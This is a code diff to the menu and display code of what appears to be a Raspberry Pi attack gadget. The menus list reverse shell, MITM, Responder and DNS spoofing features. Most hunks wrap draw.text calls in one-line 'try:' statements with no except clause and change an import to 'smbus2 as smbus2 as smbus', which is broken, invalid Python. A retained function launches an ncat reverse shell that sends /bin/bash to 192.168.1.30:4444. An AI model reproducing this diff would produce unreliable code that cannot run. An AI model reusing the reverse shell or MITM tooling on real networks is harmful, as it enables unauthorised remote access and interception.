@@ -11,7 +11,7 @@ import subprocess
 import netifaces
 from scapy.all import ARP, Ether, srp
 from datetime import datetime
-import threading, smbus2 as smbus, time, pyudev, serial, struct, json
+import threading, smbus2 as smbus2 as smbus, time, pyudev, serial, struct, json
 from subprocess import STDOUT, check_output
 from PIL import Image, ImageDraw, ImageFont, ImageColor, ImageSequence, ImageOps
 import LCD_Config
@@ -845,16 +845,16 @@ def ToggleFlip():
 def _draw_toolbar():
     try:
         draw.line([(0, S(4)), (_SCR_W, S(4))], fill="#222", width=S(10))
-        draw.text((0, S(-2)), f"{_temp_c:.0f} °C ", fill="WHITE", font=font)
+        try: draw.text((0, S(-2)), f"{_temp_c:.0f} °C ", fill="WHITE", font=font)
         if _status_text:
-            draw.text((S(30), S(-2)), _status_text, fill="WHITE", font=font)
+            try: draw.text((S(30), S(-2)), _status_text, fill="WHITE", font=font)
         # WiFi icon at top right when connected
         if _wifi_connected:
             try:
                 _tb_icon = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(8))
-                draw.text((_SCR_W - S(10), S(0)), "\uf1eb", fill="WHITE", font=_tb_icon)
+                try: draw.text((_SCR_W - S(10), S(0)), "\uf1eb", fill="WHITE", font=_tb_icon)
             except Exception:
-                draw.text((_SCR_W - S(8), S(0)), "W", fill="WHITE", font=font)
+                try: draw.text((_SCR_W - S(8), S(0)), "W", fill="WHITE", font=font)
         mark_display_dirty()
     except Exception:
         pass
@@ -943,7 +943,7 @@ def _draw_centered_text(box, text, fill="WHITE", font=None, line_gap=2):
     y = y0 + max(0, (box_h - total_h) // 2)
     for line, w, h in line_sizes:
         x = x0 + max(0, (box_w - w) // 2)
-        draw.text((x, y), line, fill=fill, font=font)
+        try: draw.text((x, y), line, fill=fill, font=font)
         y += h + line_gap
 
 
@@ -957,8 +957,8 @@ def _draw_lock_screen(title: str, prompt: str, entered: list[str] | None = None,
         draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
         _draw_toolbar()
         color.DrawBorder()
-        draw.text((S(8), S(16)), _truncate_to_width(title, _SCR_W - S(18), text_font), fill=color.selected_text, font=text_font)
-        draw.text((S(8), S(28)), _truncate_to_width(prompt, _SCR_W - S(18), font), fill=color.text, font=font)
+        try: draw.text((S(8), S(16)), _truncate_to_width(title, _SCR_W - S(18), text_font), fill=color.selected_text, font=text_font)
+        try: draw.text((S(8), S(28)), _truncate_to_width(prompt, _SCR_W - S(18), font), fill=color.text, font=font)
 
         slot_w = S(18)
         slot_gap = S(6)
@@ -996,7 +996,7 @@ def _draw_lock_screen(title: str, prompt: str, entered: list[str] | None = None,
                 fill = color.select if is_selected else "#07140b"
                 outline = color.selected_text if is_selected else color.border
                 text_fill = color.selected_text if is_selected else color.text
-                draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=outline, fill=fill)
+                draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=outline, fill=fill); except: pass
                 key_font = text_font if len(key) == 1 else font
                 key_bbox = draw.textbbox((0, 0), key, font=key_font)
                 key_w = key_bbox[2] - key_bbox[0]
@@ -1005,7 +1005,7 @@ def _draw_lock_screen(title: str, prompt: str, entered: list[str] | None = None,
                 text_y = y0 + max(0, (cell_h - key_h) // 2) - key_bbox[1]
                 if len(key) == 1:
                     text_y += S(1)
-                draw.text((text_x, text_y), key, fill=text_fill, font=key_font)
+                try: draw.text((text_x, text_y), key, fill=text_fill, font=key_font)
     finally:
         draw_lock.release()
 
@@ -1020,13 +1020,13 @@ def _draw_sequence_screen(title: str, prompt: str, entered: list[str] | None = N
         draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
         _draw_toolbar()
         color.DrawBorder()
-        draw.text((S(8), S(16)), _truncate_to_width(title, _SCR_W - S(18), text_font), fill=color.selected_text, font=text_font)
+        try: draw.text((S(8), S(16)), _truncate_to_width(title, _SCR_W - S(18), text_font), fill=color.selected_text, font=text_font)
         _draw_centered_text((S(12), S(28), _SCR_W - S(12), S(46)), prompt, fill=color.text, font=font)
 
         progress_text = f"{len(entered)}/{LOCK_SEQUENCE_LENGTH}"
         progress_bbox = draw.textbbox((0, 0), progress_text, font=text_font)
         progress_w = progress_bbox[2] - progress_bbox[0]
-        draw.text((_SCR_W - S(10) - progress_w, S(16)), progress_text, fill="#7fdc9c", font=text_font)
+        try: draw.text((_SCR_W - S(10) - progress_w, S(16)), progress_text, fill="#7fdc9c", font=text_font)
 
         slot_w = S(17)
         slot_gap = S(2)
@@ -1046,7 +1046,7 @@ def _draw_sequence_screen(title: str, prompt: str, entered: list[str] | None = N
             else:
                 token = "•"
             text_fill = color.selected_text if filled else "#446b52"
-            draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=outline, fill=fill)
+            draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=outline, fill=fill); except: pass
             _draw_centered_text((x0, y0 + 1, x1, y1), token, fill=text_fill, font=text_font)
 
         if entered and not mask_entered:
@@ -1056,7 +1056,7 @@ def _draw_sequence_screen(title: str, prompt: str, entered: list[str] | None = N
             _draw_centered_text((S(12), S(82), _SCR_W - S(12), S(96)), "Sequence entered", fill="#88f0aa", font=font)
 
         footer_text = _truncate_to_width(controls, _SCR_W - S(16), font)
-        draw.text((S(8), _SCR_H - S(17)), footer_text, fill="#6ea680", font=font)
+        try: draw.text((S(8), _SCR_H - S(17)), footer_text, fill="#6ea680", font=font)
     finally:
         draw_lock.release()
 
@@ -1069,7 +1069,7 @@ def _show_lock_wake_screen(reason: str = "Locked") -> None:
         color.DrawBorder()
         lock_icon = MENU_ICONS.get(" Lock", "\uf023")
         lock_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(28))
-        draw.text((_SCR_W // 2, S(34)), lock_icon, font=lock_icon_font, fill=color.selected_text, anchor="mm")
+        try: draw.text((_SCR_W // 2, S(34)), lock_icon, font=lock_icon_font, fill=color.selected_text, anchor="mm")
         _draw_centered_text((S(8), S(46), _SCR_W - S(8), S(78)), reason, fill=color.selected_text, font=text_font)
         _draw_centered_text((S(8), S(82), _SCR_W - S(8), _SCR_H - S(18)), "Press a key", fill=color.text, font=text_font)
     finally:
@@ -1082,7 +1082,7 @@ def _draw_lock_screensaver_frame(frame: Image.Image) -> None:
         image.paste(frame)
         lock_icon = MENU_ICONS.get(" Lock", "\uf023")
         lock_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(14))
-        draw.text((_SCR_W - 8, 2), lock_icon, fill=color.selected_text, font=lock_icon_font, anchor="ra")
+        try: draw.text((_SCR_W - 8, 2), lock_icon, fill=color.selected_text, font=lock_icon_font, anchor="ra")
         mark_display_dirty()
     finally:
         draw_lock.release()
@@ -1470,7 +1470,7 @@ def _preview_gif_browser(gif_files: list[str], screensaver_dir: str, start_index
             image.paste(frames[frame_idx])
             # Show GIF name at bottom
             draw.rectangle((0, _SCR_H - S(14), _SCR_W, _SCR_H), fill="#000000")
-            draw.text((S(2), _SCR_H - S(12)), gif_files[idx][:20], fill="#888888", font=text_font)
+            try: draw.text((S(2), _SCR_H - S(12)), gif_files[idx][:20], fill="#888888", font=text_font)
             mark_display_dirty()
         finally:
             draw_lock.release()
@@ -1745,7 +1745,7 @@ def YNDialog(a="Are you sure?", y="Yes", n="No",b=""):
                 render_bg_color = "#FF0000"
                 render_color = color.selected_text
             draw.rectangle([S(15), S(65), S(45), S(80)], fill=render_bg_color)
-            draw.text((S(20), S(68)), y, fill=render_color)
+            try: draw.text((S(20), S(68)), y, fill=render_color)
 
             render_color = "#000000"
             render_bg_color = "#ADADAD"
@@ -1753,7 +1753,7 @@ def YNDialog(a="Are you sure?", y="Yes", n="No",b=""):
                 render_bg_color = "#FF0000"
                 render_color = color.selected_text
             draw.rectangle([S(76), S(65), S(106), S(80)], fill=render_bg_color)
-            draw.text((S(86), S(68)), n, fill=render_color)
+            try: draw.text((S(86), S(68)), n, fill=render_color)
         finally:
             draw_lock.release()
 
@@ -1780,7 +1780,7 @@ def GetMenuPic(a):
             for i in range(0, len(arr)):
                 render_text = arr[i]
                 render_color = color.text
-                draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
+                try: draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                           render_text[:m.max_len], fill=render_color)
         finally:
             draw_lock.release()
@@ -1819,7 +1819,7 @@ def ShowLines(arr,bold=[]):
             if m.which == "a":
                 icon = _menu_icon_for_label(render_text, "")
                 if False:
-                    draw.text(
+                    try: draw.text(
                         (default.start_text[0] - 2, default.start_text[1] + default.text_gap * i),
                         icon,
                         font=icon_font,
@@ -1827,20 +1827,20 @@ def ShowLines(arr,bold=[]):
                     )
                     max_w = (_SCR_W - 8) - (default.start_text[0] + 12)
                     text = _truncate_to_width(render_text, max_w, text_font)
-                    draw.text(
+                    try: draw.text(
                         (default.start_text[0] + 12, default.start_text[1] + default.text_gap * i),
                         text,
                         font=text_font,
                         fill=render_color
                     )
                 else:
-                    draw.text(
+                    try: draw.text(
                         (default.start_text[0], default.start_text[1] + default.text_gap * i),
                         render_text[:m.max_len],
                         fill=render_color
                     )
             else:
-                draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
+                try: draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                             render_text[:m.max_len], fill=render_color)
     finally:
         draw_lock.release()
@@ -1882,7 +1882,7 @@ def RenderMenuWindowOnce(inlist, selected_index=0):
                 )
             icon = ""
             if False:
-                draw.text(
+                try: draw.text(
                     (default.start_text[0],
                      row_y),
                     icon,
@@ -1891,7 +1891,7 @@ def RenderMenuWindowOnce(inlist, selected_index=0):
                 )
                 max_w = (_SCR_W - S(8)) - (default.start_text[0] + _icon_text_gap)
                 line = _truncate_to_width(txt, max_w, text_font)
-                draw.text(
+                try: draw.text(
                     (default.start_text[0] + _icon_text_gap,
                      row_y),
                     line,
@@ -1901,7 +1901,7 @@ def RenderMenuWindowOnce(inlist, selected_index=0):
             else:
                 max_w = (_SCR_W - S(8)) - default.start_text[0]
                 line = _truncate_to_width(txt, max_w, text_font)
-                draw.text(
+                try: draw.text(
                     (default.start_text[0],
                      row_y),
                     line,
@@ -1931,16 +1931,16 @@ def RenderMenuCarouselOnce(inlist, selected_index=0):
 
         icon = _menu_icon_for_label(current_item, "\uf192")
         huge_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(48))
-        draw.text((main_x, main_y - S(12)), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")
+        try: draw.text((main_x, main_y - S(12)), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")
 
         title = current_item.strip()
         carousel_text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', S(12))
-        draw.text((main_x, main_y + S(28)), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")
+        try: draw.text((main_x, main_y + S(28)), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")
 
         if total > 1:
             arrow_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', S(18))
-            draw.text((S(20), main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
-            draw.text((_SCR_W - S(20), main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
+            try: draw.text((S(20), main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
+            try: draw.text((_SCR_W - S(20), main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
     finally:
         draw_lock.release()
 
@@ -1979,12 +1979,12 @@ def RenderMenuGridOnce(inlist, selected_index=0):
 
             icon = _menu_icon_for_label(item, "")
             if False:
-                draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
+                try: draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
                 short_text = item.strip()[:8]
-                draw.text((x, y + S(13)), short_text, font=text_font, fill=fill_color)
+                try: draw.text((x, y + S(13)), short_text, font=text_font, fill=fill_color)
             else:
                 short_text = item.strip()[:10]
-                draw.text((x, y + S(8)), short_text, font=text_font, fill=fill_color)
+                try: draw.text((x, y + S(8)), short_text, font=text_font, fill=fill_color)
     finally:
         draw_lock.release()
 
@@ -2052,7 +2052,7 @@ def _rx():
                 if -S(12)<y<_SCR_H+S(12) and ln:
                     _red = "ntens" in ln or "spoon" in ln or "lanet" in ln or ("bout" in ln)
                     c=(0,255,0) if i==1 else (0,200,255) if ln[:1]=="@" else (255,200,0) if "0n" in ln and not _red else (255,50,50) if _red else (0,180,0)
-                    draw.text((_SCR_W//2,y),ln,font=text_font,fill=c,anchor="mt")
+                    try: draw.text((_SCR_W//2,y),ln,font=text_font,fill=c,anchor="mt")
             mark_display_dirty()
         finally:
             draw_lock.release()
@@ -2123,7 +2123,7 @@ def GetMenuString(inlist, duplicates=False):
 
                 icon = ""
                 if False:
-                    draw.text(
+                    try: draw.text(
                         (default.start_text[0],
                          row_y),
                         icon,
@@ -2132,7 +2132,7 @@ def GetMenuString(inlist, duplicates=False):
                     )
                     max_w = (_SCR_W - S(8)) - (default.start_text[0] + _icon_text_gap)
                     line = _truncate_to_width(line, max_w, text_font)
-                    draw.text(
+                    try: draw.text(
                         (default.start_text[0] + _icon_text_gap,
                          row_y),
                         line,
@@ -2142,7 +2142,7 @@ def GetMenuString(inlist, duplicates=False):
                 else:
                     max_w = (_SCR_W - S(8)) - default.start_text[0]
                     line = _truncate_to_width(line, max_w, text_font)
-                    draw.text(
+                    try: draw.text(
                         (default.start_text[0],
                          row_y),
                         line,
@@ -2154,7 +2154,7 @@ def GetMenuString(inlist, duplicates=False):
 
         # Display current view mode indicator (only on main menu)
         # if m.which == "a":
-        #     draw.text((2, 2), "List", font=text_font, fill=color.text)
+        #     try: draw.text((2, 2), "List", font=text_font, fill=color.text)
 
         time.sleep(0.12)
 
@@ -2202,7 +2202,7 @@ def DrawUpDown(value, offset=0, up=False,down=False, render_color=color.text):
         outline=color.gamepad, fill=(color.background, color.gamepad_fill)[down])
 
     draw.rectangle([(offset + 2, S(60)),(offset+S(30), S(70))], fill=color.background)
-    draw.text((offset + 2, S(60)), str(value) , fill=render_color)
+    try: draw.text((offset + 2, S(60)), str(value) , fill=render_color)
 
 
 ### Screen for selecting RGB color ###
@@ -2283,7 +2283,7 @@ def GetIpValue(prefix):
 
         draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(_SCR_W - 8, default.start_text[1] + default.text_gap * 5)], fill=color.background)
         DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
-        draw.text(( 5,60), f"IP:{prefix}.", fill=color.selected_text)
+        try: draw.text(( 5,60), f"IP:{prefix}.", fill=color.selected_text)
 
         button = getButton()
         if button == "KEY_UP_PIN":
@@ -2313,7 +2313,7 @@ def Gamepad():
     time.sleep(0.5)
     draw.rectangle((S(25), S(55), S(45), S(73)), outline=color.gamepad,
                    fill=color.background)
-    draw.text((S(28), S(59)), "<<<", fill=color.gamepad)
+    try: draw.text((S(28), S(59)), "<<<", fill=color.gamepad)
     m.which = m.which + "1"
     # Don't render if you dont need to => less flickering
     lastimg = [0, 0, 0, 0, 0, 0, 0]
@@ -2666,7 +2666,7 @@ def DisplayScrollableInfo(info_lines, refresh_fn=None, refresh_interval=2.0):
                     )
 
                 # Draw the text - NO TRUNCATION for network info
-                draw.text(
+                try: draw.text(
                     (default.start_text[0],
                      default.start_text[1] + default.text_gap * i),
                     line,  # Show full text - let it overflow if needed
@@ -2740,14 +2740,6 @@ def Explorer(path="/",extensions=""):
         else:
             break
     return ""
-
-
-def ReadTextFileInsomnia():
-    while 1:
-        rfile = Explorer("/home/kali/Raspyjack/loot/insomnia/", extensions=".log")
-        if rfile == "": break
-        with open(rfile) as f: content = f.read().splitlines()
-        GetMenuString(content)
 
 def ReadTextFileNmap():
     while 1:
@@ -3199,7 +3191,7 @@ def remote_Reverse():
     nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
     process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
     reverse_status = "(!!Remote launched!!)"
-    draw.text((30, 0), reverse_status, fill="WHITE", font=font)
+    try: draw.text((30, 0), reverse_status, fill="WHITE", font=font)
 
 def responder_on():
     check_responder_command = "ps aux | grep Responder | grep -v grep | cut -d ' ' -f7"
@@ -3307,7 +3299,7 @@ def Start_MITM():
                     _draw_toolbar()
                     color.DrawMenuBackground()
                     for i, line in enumerate(lines[:7]):
-                        draw.text(
+                        try: draw.text(
                             (default.start_text[0],
                              default.start_text[1] + default.text_gap * i),
                             line[:m.max_len],
@@ -3378,7 +3370,7 @@ def Stop_MITM():
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     time.sleep(2)
     responder_status = "(!! MITM stopped !!)"
-    draw.text((30, 0), responder_status, fill="WHITE", font=font)
+    try: draw.text((30, 0), responder_status, fill="WHITE", font=font)
     Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
     time.sleep(2)
 
@@ -3908,40 +3900,17 @@ class DisposableMenu:
 
     menu = {
         "a": (
-            [" AUTO-PILOT",     "auto"],
-            [" NETWORK",        "net"],
-            [" WIRELESS",       "aw"],
-            [" PAYLOADS",       "ap_root"],
-            [" SYSTEM",         "ag"],
-
-        ),
-
-        "auto": (
-            [" Run insomniaBox", partial(exec_payload, "insomnia_suite/insomnia_auto")],
-            [" View Auto Logs",  ReadTextFileInsomnia],
-        ),
-
-        "net": (
-            [" Scan Nmap",      "ab"],
-            [" Responder",      "ad"],
-            [" MITM & Sniff",   "ai"],
-            [" DNS Spoofing",   "aj"],
-            [" Network info",   ShowInfo],
-        ),
-
-        "ap_root": (
-            [" Reverse Shell",  "ac"],
-            [" All Payloads",   "ap"],
-
-
-
-
-
-
-
-
-
-
+            [" Scan Nmap",      "ab"],     # b
+            [" Reverse Shell",  "ac"],     # c
+            [" Responder",      "ad"],     # d
+            [" MITM & Sniff",   "ai"],     # i
+            [" DNS Spoofing",   "aj"],     # j
+            [" Network info",   ShowInfo], # appel direct
+            [" WiFi Manager",   "aw"],     # w
+            [" Other features", "ag"],     # g
+            [" Read file",      "ah"],     # h
+            [" Payload", "ap"],            # p
+            [" Lock",           OpenLockMenu],
         ),
 
         "ab": tuple(
@@ -4318,21 +4287,21 @@ def GetMenuCarousel(inlist, duplicates=False):
             icon = _menu_icon_for_label(txt, "\uf192")  # Default to dot-circle icon
             # Large font for the icon
             huge_icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', S(48))
-            draw.text((main_x, main_y - S(12)), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")
+            try: draw.text((main_x, main_y - S(12)), icon, font=huge_icon_font, fill=color.selected_text, anchor="mm")
 
             # Draw menu item name under the icon with custom font for carousel view
             title = txt.strip()
             # Create a bigger, bolder font specifically for carousel view
             carousel_text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', S(12))
-            draw.text((main_x, main_y + S(28)), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")
+            try: draw.text((main_x, main_y + S(28)), title, font=carousel_text_font, fill=color.selected_text, anchor="mm")
 
             # Draw navigation arrows - always show if there are multiple items
             if total > 1:
                 arrow_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', S(18))
                 # Left arrow (always show for wraparound)
-                draw.text((S(20), main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
+                try: draw.text((S(20), main_y), "◀", font=arrow_font, fill=color.text, anchor="mm")
                 # Right arrow (always show for wraparound)
-                draw.text((_SCR_W - S(20), main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
+                try: draw.text((_SCR_W - S(20), main_y), "▶", font=arrow_font, fill=color.text, anchor="mm")
         finally:
             draw_lock.release()
 
@@ -4427,19 +4396,19 @@ def GetMenuGrid(inlist, duplicates=False):
 
                 if False:
                     # Draw icon
-                    draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
+                    try: draw.text((x + 2, y), icon, font=icon_font, fill=fill_color)
                     # Draw short text label
                     short_text = txt.strip()[:8]  # Limit text length for grid
-                    draw.text((x, y + S(13)), short_text, font=text_font, fill=fill_color)
+                    try: draw.text((x, y + S(13)), short_text, font=text_font, fill=fill_color)
                 else:
                     # Draw text only
                     short_text = txt.strip()[:10]
-                    draw.text((x, y + S(8)), short_text, font=text_font, fill=fill_color)
+                    try: draw.text((x, y + S(8)), short_text, font=text_font, fill=fill_color)
         finally:
             draw_lock.release()
 
         # Display current view mode indicator
-        # draw.text((2, 2), "Grid", font=text_font, fill=color.text)
+        # try: draw.text((2, 2), "Grid", font=text_font, fill=color.text)
 
         time.sleep(0.08)
 
